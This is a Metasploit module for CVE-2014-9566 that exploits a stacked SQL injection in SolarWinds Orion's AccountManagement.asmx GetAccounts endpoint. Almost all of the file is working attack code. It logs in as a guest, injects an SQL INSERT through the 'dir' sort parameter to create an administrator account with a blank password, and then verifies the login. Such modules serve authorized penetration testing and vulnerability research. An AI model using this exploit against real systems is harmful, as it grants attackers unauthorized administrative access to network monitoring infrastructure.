##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Solarwinds Orion AccountManagement.asmx GetAccounts Admin Creation',
      'Description'    => %q{
        This module exploits a stacked SQL injection in order to add an administrator user to the
        SolarWinds Orion database.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brandon Perry' #discovery/metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2014-9566']
        ],
      'DisclosureDate' => 'Feb 24 2015'
    ))

    register_options(
      [
        Opt::RPORT(8787),
        OptString.new('TARGETURI', [ true, "Base Orion directory path", '/']),
        OptString.new('USERNAME', [true, 'The username to authenticate as', 'Guest']),
        OptString.new('PASSWORD', [false, 'The password to authenticate with', ''])
      ])

  end

  def login (username,password)

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'Orion', 'Login.aspx')
    })

    viewstate = $1 if res.body =~ /id="__VIEWSTATE" value="(.*)" \/>/

    cookie = res.get_cookies

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'Orion', 'Login.aspx'),
      'method' => 'POST',
      'vars_post' => {
        '__EVENTTARGET' => '',
        '__EVENTARGUMENT' => '',
        '__VIEWSTATE' => viewstate,
        'ctl00$BodyContent$Username' => username,
        'ctl00$BodyContent$Password' => password
      },
      'cookie' => cookie
    })

    if res.nil?
      fail_with(Failure::UnexpectedReply, "Server didn't respond in an expected way")
    end

    if res.code == 200
      fail_with(Failure::NoAccess, "Authentication failed with username #{username}")
    end

    return cookie + ';' + res.get_cookies
  end

  def run
    cookie = login(datastore['USERNAME'], datastore['PASSWORD'])
    username = Rex::Text.rand_text_alpha(8)

    print_status("Logged in as #{datastore['USERNAME']}, sending payload to create #{username} admin user.")

    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'Orion', 'Services', 'AccountManagement.asmx' '/GetAccounts'),
      'method' => 'POST',
      'vars_get' => {
        'sort' => 'Accounts.AccountID', #also vulnerable
        'dir' => "ASC;insert into accounts values ('#{username}', '127-510823478-74417-8', '/+PA4Zck3arkLA7iwWIugnAEoq4ocRsYjF7lzgQWvJc+pepPz2a5z/L1Pz3c366Y/CasJIa7enKFDPJCWNiKRg==', 'Feb  1 2100 12:00AM', 'Y', '#{username}', 1, '', '', 1, -1, 8, -1, 4, 0, 0, 0, 0, 0, 0, 'Y', 'Y', 'Y', 'Y', 'Y', '', '', 0, 0, 0, 'N', 'Y', '', 1, '', 0, '');"
      },
      'data' => '{"accountId":""}',
      'cookie' => cookie,
      'ctype' => 'application/json'
    })

    login(username, '')

    print_good("The injection worked, log in with #{username} and a blank password")
  end
end
